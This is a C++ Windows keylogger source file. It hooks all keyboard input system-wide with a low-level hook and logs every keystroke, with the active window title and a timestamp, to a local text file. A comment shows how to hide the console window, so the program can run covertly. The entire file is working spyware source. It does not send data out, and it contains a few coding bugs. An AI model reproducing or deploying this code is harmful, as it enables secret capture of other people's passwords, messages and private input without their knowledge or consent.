#include <iostream>
#include <Windows.h>
#include <fstream>
#include <time.h>

#pragma warning(disable:4996)
#pragma warning(disable:4703)

using namespace std;



HHOOK hook;
KBDLLHOOKSTRUCT kbStruct;
ofstream file;

int Save(int key)
{
	char prevProg[256];

	if (key == 1 || key == 2)
	{
		return 0;
	}

	HWND foreground = GetForegroundWindow();
	DWORD threadID;
	HKL keyboardLayout;
	if (foreground)
	{
		threadID = GetWindowThreadProcessId(foreground, NULL);
		keyboardLayout = GetKeyboardLayout(threadID);
		char crrProg[256];
		GetWindowText(foreground, (LPWSTR)crrProg, 256);

		if (strcmp(crrProg, prevProg) != 0)
		{
			strcpy_s(prevProg, crrProg);
			time_t t = time(NULL);
			struct tm* tm = localtime(&t);
			char c[64];
			strftime(c, sizeof(c), "%c", tm);

			file << "\n[Program: " << crrProg << "] [DataTime: " << c << "]";

		}
		cout << key << endl;

	}

	if (key == VK_BACK)
		file << "[BACKSPACE]";
	else if (key == VK_RETURN)
		file << "\n";
	else if (key == VK_SPACE)
		file << " ";
	else if (key == VK_SHIFT)
		file << "[SHIFT]";
	else if (key == VK_CONTROL)
		file << "[CTRL]";
	else if (key == VK_ESCAPE)
		file << "[ESC]";
	else if (key == VK_END)
		file << "[END]";
	else if (key == VK_TAB)
		file << "[TAB]";
	else if (key == VK_HOME)
		file << "[HOME]";
	else if (key == VK_LEFT)
		file << "[LEFT]";
	else if (key == VK_RIGHT)
		file << "[RIGHT]";
	else if (key == VK_UP)
		file << "[UP]";
	else if (key == VK_DOWN)
		file << "[DOWN]";
	else
	{
		char crrKey;
		bool lower = ((GetKeyState(VK_CAPITAL) & 0x001) != 0);
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 ||
			(GetKeyState(VK_LSHIFT) & 0x1000) != 0 ||
			(GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
			lower = !lower;
		}
		crrKey = MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, keyboardLayout);
		if (!lower) {
			crrKey = tolower(crrKey);
		}
		file << char(crrKey);
	}
	file.flush();

	return 0;
}

LRESULT __stdcall hookCallBack__stdcall(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0) {
		if (wParam == WM_KEYDOWN) {
			kbStruct = *((KBDLLHOOKSTRUCT*)lParam);

			Save(kbStruct.vkCode);
		}
	}
	return CallNextHookEx(hook, nCode, wParam, lParam);
}

void Keylog_INIT() {
	file.open("keylog_data.txt", ios_base::app);

	if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, hookCallBack__stdcall, NULL, 0)))
	{
		
	}
	MSG message;
	while (true)
	{
		GetMessage(&message, NULL, 0, 0);
	}

}

int main() {

	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // 0 -> hide console 
	Keylog_INIT();
	return 0;

}